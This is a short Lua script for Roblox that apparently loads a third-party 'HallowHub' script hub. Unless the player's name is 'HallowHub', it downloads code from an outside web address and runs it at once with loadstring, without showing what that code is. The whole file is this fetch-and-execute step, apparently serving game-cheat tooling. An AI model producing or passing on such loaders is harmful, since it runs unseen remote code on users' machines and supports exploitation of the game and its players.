if game.Players.LocalPlayer.Name ~= "HallowHub" then
  loadstring('local service = "hallowhub"\n' .. game:HttpGet("https://orange-auth.squareweb.app/api/raw"))()
end